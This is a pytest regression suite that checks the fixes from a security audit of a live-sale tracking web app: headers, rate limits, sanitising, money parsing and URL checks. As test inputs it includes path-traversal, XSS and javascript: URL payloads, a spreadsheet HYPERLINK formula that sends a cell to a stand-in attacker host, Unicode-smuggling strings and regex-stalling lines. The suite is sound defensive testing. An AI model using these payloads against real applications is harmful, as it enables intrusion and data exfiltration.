"""Regression tests for the 2026-10-20 security audit (claude-reports/Security-Audit/).

Each test names the finding it proves fixed.
"""

import io
import json

import pytest
from openpyxl import load_workbook
from sqlalchemy import select

from app.config import Config, ConfigError
from app.db import db
from app.models import ChatMessage, ReviewItem, Sale, SaleStatus
from app.services import pipeline, reconcile, reports, rules, stock
from app.services.inventory import Actor
from tests.test_ingest import batch, row
from tests.test_pipeline import run, sales

PW = "correct-horse-battery"


def owner(client):
    h = {"X-CSRF-Token": client.get("/api/auth/csrf").get_json()["token"]}
    client.post(
        "/api/auth/signup",
        json={"organization": "Shop", "name": "O", "email": "o@shop.test", "password": PW},
        headers=h,
    )
    return h


# ---------- configuration and HTTP hardening ----------


@pytest.mark.parametrize("value", [None, "", "prod", "Production "])
def test_config_fails_closed_without_a_known_app_env(monkeypatch, value):
    """AUTH-4 / WEB-3: anything but development/test is production or refused."""
    monkeypatch.setenv("DATABASE_URL", "postgresql+psycopg://localhost:5432/x")
    monkeypatch.delenv("SECRET_KEY", raising=False)
    if value is None:
        monkeypatch.delenv("APP_ENV", raising=False)
    else:
        monkeypatch.setenv("APP_ENV", value)
    with pytest.raises(ConfigError):
        Config()  # either "unknown APP_ENV" or "SECRET_KEY must be set in production"


def test_security_headers_and_no_store_on_api(client):
    """AUTH-8 / WEB-2."""
    r = client.get("/api/health")
    assert r.headers["Cache-Control"] == "no-store"
    assert r.headers["X-Content-Type-Options"] == "nosniff"
    assert "frame-ancestors 'none'" in r.headers["Content-Security-Policy"]
    assert r.headers["X-Frame-Options"] == "DENY"
    assert r.headers["Referrer-Policy"] == "same-origin"


def test_source_maps_and_paths_outside_dist_are_not_served(client):
    """WEB-5 / WEB-10: no .map files, and no file-existence oracle outside web/dist."""
    assert client.get("/assets/index-abc.js.map").status_code == 404
    a = client.get("/..%2f..%2fapi%2fwsgi.py")  # exists on disk
    b = client.get("/..%2f..%2fapi%2fnope.py")  # does not
    assert a.status_code == b.status_code


def test_oversized_bodies_are_refused_before_parsing(client):
    """AUTH-2 / DATA-5."""
    r = client.post(
        "/api/pair", data=json.dumps({"code": "x" * 5000}), content_type="application/json"
    )
    assert r.status_code == 413
    big = b'{"x":"' + b"a" * (9 * 1024 * 1024) + b'"}'
    h = {"X-CSRF-Token": client.get("/api/auth/csrf").get_json()["token"]}
    r = client.post("/api/auth/login", data=big, content_type="application/json", headers=h)
    assert r.status_code == 413


# ---------- pairing / login rate limits ----------


def test_pairing_attempts_are_rate_limited_and_odd_codes_are_400(client):
    """DATA-10."""
    assert client.post("/api/pair", json={"code": 12345678}).status_code == 400
    assert client.post("/api/pair", json={"code": ["A"]}).status_code == 400
    codes = [client.post("/api/pair", json={"code": "ABCD-EFGH"}).status_code for _ in range(25)]
    assert codes.count(429) >= 1 and 500 not in codes


def test_login_is_rate_limited_per_address(client):
    """AUTH-2."""
    h = {"X-CSRF-Token": client.get("/api/auth/csrf").get_json()["token"]}
    codes = [
        client.post(
            "/api/auth/login", json={"email": f"n{i}@x.test", "password": "x" * 12}, headers=h
        ).status_code
        for i in range(32)
    ]
    assert codes[-1] == 429 and 500 not in codes


# ---------- ingest ----------


def test_bad_dates_and_huge_seq_are_400_not_500(client, auth):
    """DATA-7: a 500 made the extension retry forever."""
    bad_date = batch([row(1)])
    bad_date["rows"][0]["capturedAt"] = "not-a-date"
    r = client.post("/api/ingest", json=bad_date, headers=auth)
    assert r.status_code == 400
    naive = batch([row(1)])
    naive["rows"][0]["capturedAt"] = "2026-10-19T20:00:00"
    assert client.post("/api/ingest", json=naive, headers=auth).status_code == 400
    far = batch([row(1)])
    far["rows"][0]["capturedAt"] = "0001-01-01T00:00:00Z"
    assert client.post("/api/ingest", json=far, headers=auth).status_code == 400
    big = batch([row(2**31)])
    assert client.post("/api/ingest", json=big, headers=auth).status_code == 400


def test_nul_bytes_are_stripped_and_errors_do_not_echo_chat(client, app, auth):
    """DATA-7 / EXT-2."""
    r = client.post("/api/ingest", json=batch([row(1, text="hi\x00there")]), headers=auth)
    assert r.status_code == 200
    with app.app_context():
        assert db.session.scalar(select(ChatMessage.body)) == "hithere"
    long = batch([row(2, text="<img src=x onerror=alert(1)>" + "a" * 4000)])
    r = client.post("/api/ingest", json=long, headers=auth)
    assert r.status_code == 400
    assert "<img" not in json.dumps(r.get_json())


# ---------- parser ----------


def test_a_viewer_listing_does_not_decide_the_next_win(app, world):
    """DATA-2."""
    world["say"](
        app,
        [
            ("", "Auction #1: Red bundle"),
            ("viewer1", "Now selling - Mystery item"),
            ("", "lani808 won the auction!"),
        ],
    )
    run(app, world["show"])
    assert sales(app, world["show"]) == [("lani808", "paid", "RED", 1)]


def test_a_very_long_chat_line_does_not_stop_parsing(app, world):
    """DATA-3."""
    world["say"](
        app,
        [
            ("", "Up next: " + "x" * 400),
            ("", "lani808 won Red bundle"),
        ],
    )
    stats = run(app, world["show"])
    assert stats.parsed == 2
    assert sales(app, world["show"]) == [("lani808", "paid", "RED", 1)]
    c = rules.classify("", "kat.c won " + "y" * 500, "")
    assert len(c.item) <= rules.ITEM_MAX


def test_sales_cannot_be_moved_backwards_without_the_ledger(app, world):
    """DATA-18."""
    world["say"](app, [("", "lani808 won Red bundle"), ("host_shop", "cancelled for lani808")])
    run(app, world["show"])
    with app.app_context():
        sale = db.session.scalar(select(Sale))
        assert sale.status is SaleStatus.cancelled
        with pytest.raises(pipeline.ReviewError):
            pipeline.set_sale_status(sale, SaleStatus.reserved, reason="x", actor=Actor())


# ---------- reconcile (money) ----------


@pytest.mark.parametrize(
    "text,cents",
    [
        ("$25.00", 2500),
        ("25", 2500),
        ("$1,234.56", 123456),
        ("$1,234", 123400),
        ("12,500", 1250000),
        ("USD 1,050", 105000),
        ("25 USD", 2500),
        ("USD25.00", 2500),
        ("CAD$ 30.00", 3000),
        ("12,50", 1250),
        ("1000,50", 100050),
        ("12,3", 1230),
        ("1.234,56", 123456),
        ("$0.07", 7),
        ("$12.345", 1235),
        ("0", 0),
        ("-5.00", None),
        ("-$5.00", None),
        ("$-5.00", None),
        ("(5.00)", None),
        ("\u22125.00", None),
        ("$.99", None),
        ("1e3", None),
        ("2 for $10", None),
        ("1 234.56", None),
        ("21474836.48", None),
        ("", None),
        ("n/a", None),
    ],
)
def test_money_parsing_handles_thousands_separators(text, cents):
    """DATA-8."""
    assert reconcile._cents(text) == cents


def test_absurd_quantities_do_not_crash_the_import():
    """DATA-8."""
    rows = reconcile.parse_csv("Buyer,Product,Quantity,Status\nlani808,Red bundle,inf,paid\n")
    assert rows[0].quantity == 1


def test_a_line_total_only_fills_the_unit_price_when_it_divides():
    """Money review #1: a Total column is per line, Sale.price_cents is per unit."""
    rows = reconcile.parse_csv(
        "Buyer,Product,Quantity,Total,Status\nbob,Card,3,$30.00,paid\nkat,Card,3,$10.00,paid\n"
    )
    assert [r.price_cents for r in rows] == [1000, None]


def test_unmatched_payment_dedupe_is_exact(app, world):
    """DATA-9: "bob" must not be hidden by an open review about "bobby"."""
    # Neither buyer has a sale: both payments are unmatched. The old LIKE check
    # ("%bob%card%") matched bobby's open review and silently dropped bob's.
    csv = "Buyer,Product,Status\nbobby,card 2,paid\nbob,card,paid\n"
    with app.app_context():
        from app.models import Show

        show = db.session.get(Show, world["show"])
        p = reconcile.plan(show, reconcile.parse_csv(csv))
        reconcile.apply(show, p, actor=Actor(), import_id="imp")
        db.session.commit()
        buyers = sorted(
            (r.proposal or {}).get("buyer")
            for r in db.session.scalars(
                select(ReviewItem).where(ReviewItem.reason == "unmatched_payment")
            )
        )
    assert "bob" in buyers


def test_two_identical_unmatched_payments_stay_two_and_reapplying_adds_nothing(app, world):
    """Money review #2 / #8."""
    csv = "Buyer,Product,Status\nbob,Mystery Pack,paid\nBob,mystery pack,paid\n"
    with app.app_context():
        from app.models import Show

        show = db.session.get(Show, world["show"])
        for imp in ("one", "two"):  # the same file applied twice
            reconcile.apply(
                show, reconcile.plan(show, reconcile.parse_csv(csv)), actor=Actor(), import_id=imp
            )
            db.session.commit()
        n = db.session.scalar(
            select(db.func.count())
            .select_from(ReviewItem)
            .where(ReviewItem.reason == "unmatched_payment")
        )
    assert n == 2


# ---------- reports ----------


def test_excel_reports_never_contain_formulas_from_chat(app, world):
    """DATA-6 / WEB-6."""
    world["say"](app, [("", 'lani808 won =HYPERLINK("https://evil.test/?"&A2,"x") for $5')])
    run(app, world["show"])
    with app.app_context():
        from app.models import Organization

        data = reports.build(db.session.get(Organization, world["org"]))
        wb = load_workbook(io.BytesIO(data))
        formulas = [
            c.coordinate
            for ws in wb.worksheets
            for r in ws.iter_rows()
            for c in r
            if c.data_type == "f"
        ]
        assert formulas == []
        texts = [c.value for ws in wb.worksheets for r in ws.iter_rows() for c in r]
        assert any(isinstance(v, str) and v.startswith("=HYPERLINK") for v in texts)


# ---------- stock / download ----------


def test_receipt_ids_cannot_contain_like_wildcards():
    """DATA-17."""
    with pytest.raises(stock.InventoryError):
        stock._client_id("abc_def_1")


def test_download_refuses_to_bake_a_host_header_url_in_production(client, app, monkeypatch):
    """DATA-14 / EXT-11."""
    owner(client)
    monkeypatch.delenv("APP_URL", raising=False)
    monkeypatch.delenv("RENDER_EXTERNAL_URL", raising=False)
    app.config["APP_ENV"] = "production"
    try:
        info = client.get("/api/extension").get_json()
        assert info["serverUrl"] is None and info["available"] is False
    finally:
        app.config["APP_ENV"] = "test"


def test_the_extension_disconnect_revokes_its_own_key(client, app, auth):
    """EXT-5: Disconnect in the extension kills the key on the server too."""
    assert client.get("/api/ingest/ping", headers=auth).status_code == 200
    assert client.post("/api/ingest/disconnect", headers=auth).status_code == 204
    assert client.get("/api/ingest/ping", headers=auth).status_code == 401


# ---------- injected / disguised text and abuse limits (2026-10-27) ----------


def test_control_characters_and_invisible_marks_are_stripped_from_chat(client, app, auth):
    """A viewer's line is stored as plain text: no bidi overrides, zero-width or control
    characters that would make Review show something other than what the parser read."""
    sneaky = "‮won the auction‬ for​ $1\x07\r\nnext line"
    r = client.post("/api/ingest", json=batch([row(1, text=sneaky)]), headers=auth)
    assert r.status_code == 200
    with app.app_context():
        body = db.session.scalar(select(ChatMessage.body))
    assert body == "won the auction for $1 next line"
    family = "👨‍👩‍👧"  # emoji sequences keep their joiner
    client.post("/api/ingest", json=batch([row(2, text=family)]), headers=auth)
    with app.app_context():
        assert db.session.scalar(select(ChatMessage.body).where(ChatMessage.seq == 2)) == family


@pytest.mark.parametrize(
    "url,kept",
    [
        ("/live/abc", "/live/abc"),
        ("https://www.whatnot.com/live/abc", "https://www.whatnot.com/live/abc"),
        ("javascript:alert(1)", None),
        ("//evil.test/live", None),
        ("https://evil.test/live", None),
        ("http://www.whatnot.com/live/abc", None),
        ("https://whatnot.com.evil.test/x", None),
    ],
)
def test_only_a_whatnot_address_is_kept_for_a_show(client, app, auth, url, kept):
    from app.models import Show

    b = batch([row(1)])
    b["show"]["url"] = url
    assert client.post("/api/ingest", json=b, headers=auth).status_code == 200
    with app.app_context():
        assert db.session.scalar(select(Show.source_url)) == kept


def test_uploaded_csv_cells_lose_controls_and_invisible_marks():
    rows = reconcile.parse_csv("Buyer,Product,Status\n‮eve\x1b[31m,Red​ bundle,Paid\n")
    assert (rows[0].buyer, rows[0].item) == ("eve[31m", "Red bundle")


def test_wrong_device_keys_are_rate_limited_per_address(client):
    codes = [
        client.get("/api/ingest/ping", headers={"Authorization": f"Bearer wn_guess{i}"}).status_code
        for i in range(35)
    ]
    assert codes[:30] == [401] * 30 and codes[-1] == 429


def test_one_device_cannot_flood_the_api(client, auth, monkeypatch):
    from app.routes import ingest as ingest_routes

    monkeypatch.setattr(ingest_routes, "DEVICE_CALLS_PER_MIN", 5)
    codes = [client.get("/api/ingest/ping", headers=auth).status_code for _ in range(7)]
    assert codes[:5] == [200] * 5 and codes[-1] == 429


def test_a_signed_in_person_has_a_write_limit(client, monkeypatch):
    from app import auth as auth_mod

    h = owner(client)
    monkeypatch.setattr(auth_mod, "WRITES_PER_MIN", 3)
    codes = [
        client.post("/api/inventory/import", json={"csv": "x"}, headers=h).status_code
        for _ in range(5)
    ]
    assert 429 in codes and 500 not in codes


def test_upload_routes_refuse_non_text_bodies(client):
    h = owner(client)
    for bad in ({"csv": ["a"]}, {"csv": {"x": 1}}, {"csv": 5}):
        assert client.post("/api/inventory/import", json=bad, headers=h).status_code == 400


@pytest.mark.parametrize(
    "line",
    [
        "bob won" + " " * 3990 + "x",
        "bob won" + " ​" * 1990 + " x",
        "sold to bob - " + "item " * 790 + "for",
        "bob won " + "a " * 1990 + "$",
    ],
)
def test_a_long_crafted_line_classifies_in_milliseconds(line):
    """One viewer line made of spaces (or zero-width spaces the cleaner removes) used to make
    the item / price patterns backtrack for minutes and stall every parse."""
    import time

    from app.services import text

    stored = text.clean(line)
    t = time.perf_counter()
    rules.classify("", stored, stored)
    rules.classify("viewer", stored, stored, host="host_shop")
    assert time.perf_counter() - t < 0.05


def test_a_friendly_host_line_does_not_back_an_ai_cancel():
    from app.services.supervisor import _says_it_went_wrong

    assert not _says_it_went_wrong("lani808 no refunds on mystery packs, enjoy!")
    assert not _says_it_went_wrong("lani808 we do not cancel")
    assert _says_it_went_wrong("lani808 card declined, relisting")


def test_the_ai_has_an_hourly_budget_per_shop(app, world, monkeypatch):
    from app.models import AiCall
    from app.services import supervisor

    monkeypatch.setenv("AI_PROVIDER", "fake")
    monkeypatch.setattr(supervisor, "AI_CALLS_PER_HOUR", 2)
    with app.app_context():
        for _ in range(4):
            supervisor.ask("classify_line", "x", "hello", {"type": "object"}, org_id=world["org"])
        db.session.commit()
        errors = db.session.scalars(select(AiCall.error).order_by(AiCall.id)).all()
    assert errors[2:] == ["hourly AI budget", "hourly AI budget"]
    assert "hourly AI budget" not in errors[:2]


def test_pick_sale_only_takes_one_of_the_items_choices(app, world):
    from app.models import User

    world["say"](
        app,
        [
            ("", "lani808 won Red bundle"),
            ("", "lani808 won Red bundle for $25"),
            ("", "kat.c won Red bundle"),
        ],
    )
    world["say"](app, [("host_shop", "cancelled for lani808")])
    run(app, world["show"])
    with app.app_context():
        item = db.session.scalar(select(ReviewItem).where(ReviewItem.reason == "ambiguous_sale"))
        kat = db.session.scalar(select(Sale).where(Sale.buyer_username == "kat.c"))
        u = User(
            organization_id=world["org"],
            email="o@x.test",
            name="O",
            password_hash="x",
            role="owner",
            session_token="t",
        )
        db.session.add(u)
        db.session.flush()
        with pytest.raises(pipeline.ReviewError, match="not one of this item's choices"):
            pipeline.resolve(item, "pick_sale", {"saleId": kat.id}, user=u)
        for bad in ({"saleId": "abc"}, {"saleId": [1]}, {"saleId": True}):
            with pytest.raises(pipeline.ReviewError):
                pipeline.resolve(item, "pick_sale", bad, user=u)
        db.session.rollback()
    assert [s[1] for s in sales(app, world["show"]) if s[0] == "kat.c"] == ["paid"]


def test_deeply_nested_json_is_400_not_500(client, auth):
    deep = "[" * 100_000 + "]" * 100_000
    r = client.post("/api/ingest", data=deep, headers={**auth, "Content-Type": "application/json"})
    assert r.status_code == 400
